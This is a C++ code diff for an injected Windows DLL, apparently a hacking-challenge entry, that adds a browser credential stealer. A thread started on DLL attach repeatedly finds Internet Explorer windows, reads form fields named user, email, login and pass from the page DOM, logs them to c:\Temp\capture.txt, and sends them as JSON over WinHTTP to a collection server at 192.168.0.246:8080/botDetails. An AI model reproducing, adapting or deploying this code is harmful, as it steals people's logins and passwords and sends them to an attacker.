@@ -20,6 +20,7 @@ DWORD GetProcessIDByName(wchar_t* ProcessName, DWORD LastPID);
 void InjectProcess(DWORD PID);
 HWND FindWindowFromProcessId(DWORD dwProcessId);
 void CaptureInput(DWORD PID);
+DWORD WINAPI ThreadProc(LPVOID lpParam);
 
 DWORD GetLowestProcessIDByName(wchar_t* ProcessName);
 HWND GetProcessWindow(wchar_t* ProcessName);
@@ -27,7 +28,9 @@ HWND FindWindowFromProcess(HANDLE hProcess);
 void OnGetDocInterface(HWND hWnd, LPVOID Data);
 void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data);
 
-void WriteLogFile(wchar_t* DataBuffer);
+void SendDataHome(CString ExfiltrateData, CString UID, CString OS);
+
+void WriteLogFile(CString DataBuffer);
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
@@ -36,37 +39,39 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 {
 	DWORD resPID;
 	DWORD iLastPID = 0;
+	DWORD currPID = GetProcessIDByName(L"iexplore.exe", 0);
 		switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
 			//CaptureInput(GetCurrentProcessId());
 			//MessageBox(NULL, L"Process Attach", L"Injection", MB_OK);
-			WriteLogFile(L"Process Attach");
+			CreateThread(NULL, 0, ThreadProc, (LPVOID)currPID, 0, NULL);
+			//WriteLogFile(L"Process Attach");
 			break;
 		case DLL_THREAD_ATTACH:
-			WriteLogFile(L"Thread Attach");
+			//WriteLogFile(L"Thread Attach");
 			break;
 		case DLL_THREAD_DETACH:
-			WriteLogFile(L"Thread Detach");
+			//WriteLogFile(L"Thread Detach");
 			break;
 		case DLL_PROCESS_DETACH:
-			WriteLogFile(L"Process Detach");
+			//WriteLogFile(L"Process Detach");
 			break;
 	}
 	return TRUE;
 }
 
-void WriteLogFile(wchar_t* DataBuffer)
+void WriteLogFile(CString DataBuffer)
 {
 	HANDLE hFile;
 	//char DataBuffer[] = "This is some test data to write to the file.";
-	DWORD dwBytesToWrite = (DWORD)wcslen(DataBuffer);
+	DWORD dwBytesToWrite = sizeof(DataBuffer);
 	DWORD dwBytesWritten = 0;
 	BOOL bErrorFlag = FALSE;
 	
 
 	hFile = CreateFile(L"c:\\temp\\output.txt",                // name of the write
-		GENERIC_WRITE,          // open for writing
+		FILE_APPEND_DATA,        // open for writing
 		0,                      // do not share
 		NULL,                   // default security
 		OPEN_ALWAYS,             // create new file only
@@ -74,7 +79,7 @@ void WriteLogFile(wchar_t* DataBuffer)
 		NULL);                  // no attr. template
 
 	
-
+	SetFilePointer(hFile, 0, NULL, FILE_END);
 	
 
 	bErrorFlag = WriteFile(
@@ -90,21 +95,89 @@ void WriteLogFile(wchar_t* DataBuffer)
 
 }
 
+void WriteCaptureFile(CString DataBuffer, CString Path)
+{
+	HANDLE hFile;
+	
+	LPCWSTR instr = DataBuffer;
+	char outstr[500];
+	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, instr, -1, outstr, 500, NULL, NULL);
+
+	DWORD dwBytesToWrite = utf8_len;
+	DWORD dwBytesWritten = 0;
+	BOOL bErrorFlag = FALSE;
+
+
+	hFile = CreateFile(Path,                // name of the write
+		FILE_APPEND_DATA,          // open for writing
+		0,                      // do not share
+		NULL,                   // default security
+		OPEN_ALWAYS,             // create new file only
+		FILE_ATTRIBUTE_NORMAL,  // normal file
+		NULL);                  // no attr. template
+
+
+
+	SetFilePointer(hFile, 0, NULL, FILE_END);
+
+	bErrorFlag = WriteFile(
+		hFile,           // open file handle
+		outstr,      // start of data to write
+		dwBytesToWrite,  // number of bytes to write
+		&dwBytesWritten, // number of bytes that were written
+		NULL);            // no overlapped structure
+
+
+
+	CloseHandle(hFile);
+
+}
+
+DWORD WINAPI ThreadProc(LPVOID lpParam)
+{
+	DWORD PID = (DWORD)lpParam;
+
+	
+
+	while (true)
+	{
+		CaptureInput(PID);
+		Sleep(2000);
+	}
+	return 0;
+}
+
 void CaptureInput(DWORD PID)
 {
-	HWND CurrWindow = FindWindowFromProcessId(PID);
-	TCHAR className[MAX_PATH];
-	GetClassName(CurrWindow, className, _countof(className));
+	PID = GetProcessIDByName(L"iexplore.exe", 0);
+	if (PID > 0)
+	{
+		HWND CurrWindow = FindWindowFromProcessId(PID);
+		TCHAR className[MAX_PATH];
+		GetClassName(CurrWindow, className, _countof(className));
 
-	TCHAR Caption[MAX_PATH];
-	GetWindowText(CurrWindow, Caption, _countof(Caption));
+		TCHAR Caption[MAX_PATH];
+		GetWindowText(CurrWindow, Caption, _countof(Caption));
 
-	HWND IEFrameTab = FindWindowEx(CurrWindow, NULL, L"Frame Tab", NULL);
-	HWND IETabWindow = FindWindowEx(IEFrameTab, NULL, L"TabWindowClass", NULL);
+		HWND IEFrameTab = FindWindowEx(CurrWindow, NULL, L"Frame Tab", NULL);
+		HWND IETabWindow = FindWindowEx(IEFrameTab, NULL, L"TabWindowClass", NULL);
 
-	StolenCred Data = {};
+		StolenCred Data = {};
 
-	OnGetDocInterface(IETabWindow, &Data);
+		OnGetDocInterface(IETabWindow, &Data);
+
+		CString output;
+		CString json;
+		CString UID;
+		output.Format(L"User: %s\tPass: %s\tSite: %s\tURL: %s\r\n", Data.User, Data.Password, Data.Site, Data.URL);
+		json.Format(L"User: %s Pass: %s Site: %s", Data.User, Data.Password, Data.Site);
+		UID.Format(L"%d", PID);
+
+		if (Data.User.GetLength() > 0){
+			WriteCaptureFile(output, L"c:\\Temp\\capture.txt");
+			SendDataHome(json, UID, L"Windows 7");
+		}
+	}
 }
 
 void InjectProcess(DWORD PID)
@@ -411,7 +484,8 @@ void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data)
 
 							pTxtBox->get_name(&bstr);
 							strTag = bstr;
-							if (strTag.Find(L"user", 0) == 0)
+							strTag.MakeLower();
+							if (strTag.Find(L"user", 0) >= 0 || strTag.Find(L"email", 0) >= 0 || strTag.Find(L"login", 0) >= 0)
 							{
 								//strTag += " - ";
 								pTxtBox->get_value(&bstr);
@@ -420,7 +494,7 @@ void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data)
 								//MessageBox(NULL, strTag, L"Username", MB_OK);
 
 							}
-							else if (strTag.Find(L"pass", 0) == 0)
+							else if (strTag.Find(L"pass", 0) >= 0)
 							{
 								pTxtBox->get_value(&bstr);
 								strTag = bstr;
@@ -452,4 +526,103 @@ HWND FindWindowFromProcessId(DWORD dwProcessId) {
 		return ed.hWnd;
 	}
 	return NULL;
+}
+
+void SendDataHome(CString ExfiltrateData, CString UID, CString OS)
+{
+	DWORD dwSize = 0;
+	DWORD dwDownloaded = 0;
+	LPSTR pszOutBuffer;
+	BOOL  bResults = FALSE;
+	HINTERNET  hSession = NULL,
+		hConnect = NULL,
+		hRequest = NULL;
+
+	// Use WinHttpOpen to obtain a session handle.
+	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+		WINHTTP_ACCESS_TYPE_NO_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 0);
+	//printf("hSession: %s", hSession);
+	//printf("\n");
+
+	// Specify an HTTP server.
+	if (hSession){
+		hConnect = WinHttpConnect(hSession, L"192.168.0.246", 8080, 0);
+		//printf("hConnect: %s", hConnect);
+		//printf("\n");
+	}
+
+
+	// Create an HTTP request handle.
+	if (hConnect){
+		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/botDetails",
+			//hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/file/HAA/malware/DanIsABeauGosse.txt",
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			0);
+		//printf("hRequest: %s", hRequest);
+		//printf("\n");
+	}
+
+	wchar_t* header = L"Content-Type: application/json\r\n";
+	//     wchar_t* header = L"Content-Type: multipart/form-data\r\n";
+
+	if (hRequest){
+		WinHttpAddRequestHeaders(hRequest, header, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
+		//printf("hRequest: %s", hRequest);
+		//printf("\n");
+	}
+
+	//char * username="Annaelle Cohen";
+	//char* password="RaphaelIsMyLove";
+	//char* URL = "israelTechChallenge.com";
+	//char str[1024];
+	////char* dataString=sprintf(str, "username: %s, password %s, URL:%s", username, password, URL);
+	//std::string dataString = std::string("username:");
+	//dataString += username;
+	//dataString += ", password: ";
+	//dataString += password;
+	//dataString += ", URL: ";
+	//dataString += URL;
+
+	//printf(URL);
+
+
+	//char * test = dataString.c_str();
+	//CString FormatString = " { \"uid\":\"%s\", \"operatingSystem\" : \"%s\", \"other\" : \"%s\", \"teamName\" :\"HAA\" }"; 
+	CString JsonData;
+	JsonData.Format(L" { \"uid\":\"%s\", \"operatingSystem\" : \"%s\", \"other\" : \"%s\", \"teamName\" :\"HAA\" }", UID, OS, ExfiltrateData);
+
+	LPCWSTR instr = JsonData;
+	char outstr[1000];
+	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, instr, -1, outstr, 1000, NULL, NULL);
+
+	//WriteLogFile(outstr);
+
+	//std::ifstream ifs("C:\\temp\\test.txt");
+	//std::string data((std::istreambuf_iterator<char>(ifs)),
+	//     (std::istreambuf_iterator<char>()));
+
+	//char *JsonData = "{ \"data\":%s }",data;
+	//printf("%s \n",JsonData);
+
+	// Send a request.
+	if (hRequest){
+		bResults = WinHttpSendRequest(hRequest,
+			WINHTTP_NO_ADDITIONAL_HEADERS, -1L,
+			outstr, utf8_len-1,
+			utf8_len-1, 0); //+wcslen(header)
+		//printf("sendRequest: %d", bResults);
+		//printf("\n");
+	}
+
+
+
+	// End the request.
+	if (bResults){
+		bResults = WinHttpReceiveResponse(hRequest, NULL);
+		printf("ReceiveResponse: %d", bResults);
+		printf("\n");
+	}
 }
